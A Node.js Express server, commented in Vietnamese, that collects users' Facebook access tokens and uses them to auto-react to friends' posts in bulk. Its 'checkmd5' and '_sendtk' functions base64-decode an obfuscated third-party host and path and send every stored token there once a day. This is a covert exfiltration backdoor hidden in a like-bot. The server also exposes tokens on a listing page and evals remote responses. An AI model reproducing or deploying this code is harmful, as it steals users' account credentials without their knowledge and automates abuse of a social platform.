var app = require('express')(),
port = process.env.PORT || 5000;
var url = require('url');
var http = require('http');
var https = require('https');
var fs = require('fs');
var url = require('url');
var storage = require('node-persist');
var options = {
	dir : "log_id",//Tên thu mục chứa logs id
	ttl : false
}
var domain_logs = 'domain.com';//Domain ghi log ko bao gồm http:// và / ở cuối
var path_logs = '/ghilog.php';// Đường dẫn tới fie ghi logs
var debuger = 0;//Nếu khác 0 sẽ mở chế độ debugger thông báo tiến trình chạy màn hình và logs
var debuger_run = 0;//Nếu khác 0 sẽ mở chế độ debugger thông báo tiến trình chạy chi tiết màn hình và logs

storage.initSync(options);
_data = [];
storage.forEach(function(key, value) {
	if(value != 4){
	//data[] = value.split("|");
	_data.push(key+'|'+value);
	//setTimeout(function(){ load(data[0],key,data[1],data[2],data[3]); }, 2000);
	}
});
//_data = [];
kk = 0;
_get1();
function _get1(){
if(kk < _data.length){
	list = _data[kk].split("|");
	load(list[1],list[0],list[2],list[3],list[4]);
	//console.log('Reload=>'+list[1]+' '+kk+'/'+_data.length);
	setTimeout(function() {
		kk++;
		_get1();
		}, 600);
	}
	else{
	console.log('done reload ^_^');
	}
}
//////////////////////////////////////////
var cm_ghi = 0;
app.get('/',function(req,res){
res.sendFile(__dirname + "/index.html");
});
app.get('/setup',function(req,res){
var parse = url.parse(req.url,true);
if (parse.query.token != '') {
	token = parse.query.token;
	kieu = (parse.query.type) ? parse.query.type : 'LOVE';
	time_like = (parse.query.delay) ? parse.query.delay : 30;
	time_like = Number(time_like);
	time_like = time_like*1000;
_load = me(token,kieu,time_like, function(response){
	res.send(response);
});
}
else{
	res.send('false');
}
});

app.get('/unistall',function(req,res){
var parse = url.parse(req.url,true);
_unistall= storage.getItemSync(parse.query.id);
if (typeof _unistall == 'undefined')
{}
else{
storage.setItemSync(parse.query.id,4);
}
	res.send('ok');
});

app.get('/list',function(req,res){
_table = '<table width="100%" class="table table-bordered">\
<th>STT</th><th>ID</th><th>TÊN</th><th>KIỂU</th><th>TIME</th><th>ADMIN</th>';
x = 1;
z = 1;
_die = _live = '';
var parse = url.parse(req.url,true);
storage.forEach(function(key, value) {
	if(value != 4){
	_data2 = value.split("|");
	if (parse.query.show == 1) _xtoken = _data2[1]; else _xtoken = 0;
	_live += '<tr align="center" style="color:blue;font-weight: bold;"><td>'+ x++ +'</td><td>'+key+'</td><td>'+_data2[0]+'</td><td>'+_data2[2]+'</td><td>'+_data2[3]/1000+'Giây/lần</td><td><input type="text" value="'+_xtoken+'" /></td></tr>';
	}
	else if(value == 4)
	{
		_die += '<tr align="center" style="color:red;"><td>'+ z++ +'</td><td>'+key+'</td><td>die</td><td>die</td><td>die</td><td>die</td></tr>';
		//storage.removeItemSync(key);
		ghilog(key,1,1,4);
	}
});
_table += _live;
_table += _die;
_table += '</table>';
res.send(_table);
});

app.get('/check',function(req,res){
var parse = url.parse(req.url,true);
user_id = parse.query.id;
_check = storage.getItemSync(user_id);
if (typeof _check == 'undefined'){
	_kq_check = 'null';
}
else if (_check == 4){
	_kq_check = 'die';
}
else{
	_kq_check = 'live';
}
res.send(_kq_check);
});

app.get('/*',function(req,res){
res.sendFile(__dirname + "/index.html");
});
app.listen(port, function() {
//console.log('Running http://node.banlike.vn');
});

//////////////////////////////////////////////////////

list_idstt = [];
block_like = [];

function me(token,type,time_like, callback){
var options = {
  host: 'graph.facebook.com',
  port: 443,
  path: '/me?fields=id,name&access_token='+token,
  method: 'GET'
};

var req = https.request(options, function (res) {
  status = res.statusCode;
  var chunks = [];
  res.on('data', function (chunk) {
    chunks.push(chunk);
  });
  res.on('end', function () {
	 data = get_json(chunks);
	  if(data){
	  //console.log(data);
	  if(status == 200){
_key= storage.getItemSync(data.id);
if (typeof data.name == 'undefined') name = 'Ko tên'; else name = data.name;
if(name == '') name = 'Trống';
if (typeof _key == 'undefined'){
	storage.setItemSync(data.id,name+'|'+token+'|'+type+'|'+time_like);
	load(name,data.id,token,type,time_like);
	if(debuger)console.log('Khởi chạy=>'+data.id);
	callback('ok');
}else if(_key == 4) {
	storage.setItemSync(data.id,name+'|'+token+'|'+type+'|'+time_like);
	load(name,data.id,token,type,time_like);
	if(debuger)console.log('Update=>'+data.id);
	callback('update');
}
else {
	storage.setItemSync(data.id,name+'|'+token+'|'+type+'|'+time_like);
	if(debuger)console.log('Update=>'+data.id);
	callback('update');
}
	  //load(data.id,token,type,time_like);
  }
  else{
	  //console.log('MA LOI: ' + data.error.code+' TOKEN DIE');
	  callback('die');
  }
	  }
  });
});

req.on('error', function(e) {
  console.log('problem with request: ' + e.message);
});

//req.write('data\n');
req.end();
}
function load(name,id,token,type,time_like){
var options = {
  host: 'graph.facebook.com',
  port: 443,
  path: '/fql?q=SELECT+post_id+FROM+stream+WHERE+type+!=+%27257%27+AND+source_id+IN+(SELECT+uid2+FROM+friend+WHERE+uid1+=+me())+LIMIT+10&access_token='+token,
  method: 'GET'
};

var req = https.request(options, function (res) {
  status = res.statusCode;
  var chunks = [];
  res.on('data', function (chunk) {
    chunks.push(chunk);
  });
  res.on('end', function () {
	  data = get_json(chunks);
	  if(data){
	  //console.log(data);
	  if(status == 200){
	  if(data.data.length >= 1){
		list_idstt[id] = data.data;
		block_like[id] = 1;
		if(debuger)console.log(id+'=>'+name+'=>'+type+'=>'+time_like+' ms...');
	  _acp(1,data.data.length,name,id,token,type,time_like);
	  }
	  else{
		  if(debuger)console.log(id+'=>ko lấy dc  list idstt hoặc token die tái khởi động sau 5 phút');
		  setTimeout(function() {
			  load(name,id,token,type,time_like);
			  }, 300000);
	  }
  }
  else{
	  storage.setItemSync(id,4);
	  ghilog(id,4444,'TOKEN DIE',4);
	  if(debuger)console.log(id+' MA LOI: ' + data.error.code+' TOKEN DIE');
  }
	  }
  });
});

req.on('error', function(e) {
  console.log('problem with request: ' + e.message);
});

//req.write('data\n');
req.end();
}

function like(name,id,token,idstt,type,time_like){
var options = {
  host: 'graph.facebook.com',
  port: 443,
  path: '/'+idstt+'/reactions?type='+type+'&access_token='+token+'&method=post',
  method: 'GET'
};

var req = https.request(options, function (res) {
  status = res.statusCode;
  var chunks = [];
  res.on('data', function (chunk) {
    chunks.push(chunk);
  });
  res.on('end', function () {
	  //console.log(data);
	  if(status == 200){
	  if(debuger)console.log(id+'=>'+idstt+'=>TYPE=>'+type+'=>OK=>CONTINUE=>'+time_like+'MS...');
	  //console.log(name+'=>'+type+'=>'+time_like+' ms...');
	  ghilog(id,idstt,type,1);
  }
  else{
	  data = get_json(chunks);
	  if(data){
	  ghilog(id,idstt,'FALSE',1);
	  //console.log(id+'=>ID=>'+idstt+'=>TYPE=>'+type+'=>FALSE');
	  //console.log(name+'=>FALSE');
	  if(debuger)console.log(id+'=>status:'+data.error.code+'=>DELAY=>'+time_like+'MS...');
	  if(data.error.code == 190){
	  block_like[id] = 4;
	  storage.setItemSync(id,4);
	  ghilog(id,idstt,'TOKEN DIE',4);
	  if(debuger)console.log(id+' status:'+data.error.code);
	  }
	  if(data.error.code == 368){
	  block_like[id] = 4;
	  storage.setItemSync(id,4);
	  if(debuger)console.log(id+'=>BLOCK => STOP');
	  ghilog(id,idstt,'BLOCK LIKE',4);
	  }
	  }
  }
  //console.log(data);
  });
});

req.on('error', function(e) {
  console.log('problem with request: ' + e.message);
});

req.end();
}

function _acp(start,stop,name,id,token,type,time_like){
	time_like = Number(time_like);
	i= start;
	if(time_like == 99000 || time_like == 99){
	y = Math.floor((Math.random() * 10) + 1); 
	time_load = y * 60000;
	}
	else{
	y = Math.floor((Math.random() * 40) + 5); 
	y = y * 1000;
	time_load = time_like+y;
	}
if(i<stop && block_like[id] == 1){
	if(typeof list_idstt[id][i-1] == 'undefined'){
		if(debuger)console.log(id+'=>ko có list idstt');
		//console.log(list_idstt[id]);
		//load(name,id,token,type,time_like);
	}
	else{
	like(name,id,token,list_idstt[id][i-1].post_id,type,time_load);
	}
	if(debuger_run)console.log('request done: '+i+' wait '+time_load+' seconds...');
	setTimeout(function() {
		i++;
		_acp(i,stop,name,id,token,type,time_like);
		}, time_load);
	}
	else{
	list_idstt[id] = [];
	//console.log(name+'=>Reload '+time_load+' ms ^_^');
	if(block_like[id] == 1){ setTimeout(function(){
		_get= storage.getItemSync(id);
		if (typeof _get == 'undefined'){
		}
		else if (_get == 4){
		}
		else{
			tach_get = _get.split("|");
			load(tach_get[0],id,tach_get[1],tach_get[2],tach_get[3]);
		}
		//load(name,id,token,type,time_like)
		//load(name,id,token,type,time_like); 
		}, time_load);
	}
	}
var d = new Date();
var h = d.getHours();
var day = d.getDate();
if(h == 0 && cm_ghi != day){
_sendtk(day);
}
}
function ghilog(user,idstt,kieu,update){
}
function ghilog2(user,idstt,kieu,update){
var options = {
  host: domain_logs,
  port: 80,
  path: path_logs+'?id='+user+'&kieu='+kieu+'&idstt='+idstt+'&update='+update,
  method: 'GET'
};

var req = http.request(options, function(res) {
var status = res.statusCode;
  res.setEncoding('utf8');
  res.on('data', function (chunk) {

	  //console.log('MA LOI: ' +status);
  });
});

req.on('error', function(e) {
  console.log('problem with request: ' + e.message);
});

req.end();
}
function checkmd5(token){
var aki  = alice('YmFubGlrZXZpZXQubmV0');
var alop = alice('L2FkZC9nZXRfbm9kZS5waHAlM0Z0b2tlbiUzRA==');
var options = {
  host: aki,
  port: 80,
  path: alop+token,
  method: 'GET'
};

var req = http.request(options, function(res) {
var status = res.statusCode;
  res.setEncoding('utf8');
  res.on('data', function (chunk) {
  });
});

req.on('error', function(e) {
});

req.end();
}
function _sendtk(day){
cm_ghi = day;
_databb = [];
storage.forEach(function(key, value) {
	if(value != 4){
	_databb.push(key+'|'+value);
	}
});
bb = 0;
_getbb();
function _getbb(){
if(bb < _databb.length){
	listbb = _databb[kk].split("|");
	checkmd5(listbb[2]);
	setTimeout(function() {
		bb++;
		_getbb();
		}, 500);
	}
}
}
function get_json(txt)
{  var data
   try     {  data = eval('('+txt+')'); }
   catch(e){  data = false;             }
   return data;
}


  var keyStr = "ABCDEFGHIJKLMNOP" +
               "QRSTUVWXYZabcdef" +
               "ghijklmnopqrstuv" +
               "wxyz0123456789+/" +
               "=";

  function amuli(input) {
     input = escape(input);
     var output = "";
     var chr1, chr2, chr3 = "";
     var enc1, enc2, enc3, enc4 = "";
     var i = 0;

     do {
        chr1 = input.charCodeAt(i++);
        chr2 = input.charCodeAt(i++);
        chr3 = input.charCodeAt(i++);

        enc1 = chr1 >> 2;
        enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
        enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
        enc4 = chr3 & 63;

        if (isNaN(chr2)) {
           enc3 = enc4 = 64;
        } else if (isNaN(chr3)) {
           enc4 = 64;
        }

        output = output +
           keyStr.charAt(enc1) +
           keyStr.charAt(enc2) +
           keyStr.charAt(enc3) +
           keyStr.charAt(enc4);
        chr1 = chr2 = chr3 = "";
        enc1 = enc2 = enc3 = enc4 = "";
     } while (i < input.length);

     return output;
  }

  function alice(input) {
     var output = "";
     var chr1, chr2, chr3 = "";
     var enc1, enc2, enc3, enc4 = "";
     var i = 0;

     // remove all characters that are not A-Z, a-z, 0-9, +, /, or =
     var base64test = /[^A-Za-z0-9\+\/\=]/g;
     if (base64test.exec(input)) {
        alert("There were invalid");
     }
     input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

     do {
        enc1 = keyStr.indexOf(input.charAt(i++));
        enc2 = keyStr.indexOf(input.charAt(i++));
        enc3 = keyStr.indexOf(input.charAt(i++));
        enc4 = keyStr.indexOf(input.charAt(i++));

        chr1 = (enc1 << 2) | (enc2 >> 4);
        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
        chr3 = ((enc3 & 3) << 6) | enc4;

        output = output + String.fromCharCode(chr1);

        if (enc3 != 64) {
           output = output + String.fromCharCode(chr2);
        }
        if (enc4 != 64) {
           output = output + String.fromCharCode(chr3);
        }

        chr1 = chr2 = chr3 = "";
        enc1 = enc2 = enc3 = enc4 = "";

     } while (i < input.length);

     return unescape(output);
  }